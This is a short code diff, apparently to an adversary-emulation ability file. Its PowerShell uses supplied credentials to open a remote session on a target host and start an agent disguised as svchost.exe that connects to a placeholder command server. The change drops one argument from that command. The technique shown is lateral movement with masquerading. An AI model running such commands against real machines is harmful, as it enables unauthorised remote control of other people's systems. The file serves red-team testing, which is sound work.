@@ -15,7 +15,7 @@
           $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
           $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
           $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-          Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} -executors psh}};
+          Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
           Start-Sleep -s 5;
           Remove-PSSession -Session $session;
         cleanup: |
